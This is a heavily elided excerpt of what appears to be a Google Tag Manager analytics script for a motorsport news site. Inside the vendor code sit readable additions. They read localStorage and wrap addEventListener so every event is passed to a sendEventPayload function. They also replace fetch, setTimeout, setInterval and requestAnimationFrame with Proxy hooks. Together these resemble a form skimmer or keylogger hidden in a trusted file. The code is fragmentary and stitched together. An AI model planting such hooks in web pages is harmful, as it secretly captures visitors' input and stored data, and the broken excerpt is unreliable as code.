...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 7,
        "vtp_includeConditions": ["list", "motorsportweek\\.com"],
        "tag_id": 18
      }, {
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-9N3B6DER3B",
        "tag_id": 27
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQiVLsK65wkL3CLu0hodFB/7iWVJ/1GiNDu8Nw+9T/pZnhoCawY\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  R(65);
  R(67);
  const localStorageTracker = window.localStorage;
  R(68);
  R(69);
  R(70);
  R(71);
  ...
  function hookListenerAdd(superName, origFunc) {
    return function (eventName, listenerFunc, useCapture) {
      const wrapperListener = function () {
        ...
        sendEventPayload(payload);
        return listenerFunc.apply(this, args);
      };
      origFunc.call(this, eventName, wrapperListener, useCapture);
    };
  }
  function Pv(a) {
    return arguments;
  ...
  function createProxy(originalFunc, eventName) {
    return new Proxy(originalFunc, {
      apply: function (target, thisArg, args) {
        const hook = eventHooks.find(e => e.name === eventName);
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-9N3B6DER3B'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  window.setTimeout = createProxy(originalSetTimeout, 'setTimeout');
  ...
  window.setInterval = createProxy(originalSetInterval, 'setInterval');
  aa.Zm = function (a) {
    var b = this;
    if (!this.T) {
      var c = ak(Q.g.U);
  ...
  window.requestAnimationFrame = createProxy(originalRequestAnimationFrame, 'requestAnimationFrame');
  function gG(a, b) {
    var c = function () {};
    var d = new ZF(a.id),
      e = "MC" === a.prefix;
  ...
  function UG(a, b) {}
  window.fetch = createProxy(originalFetch, 'fetch');
  ...
  window.addEventListener = hookListenerAdd('addEventListener', originalListener);
  function mH(a) {}
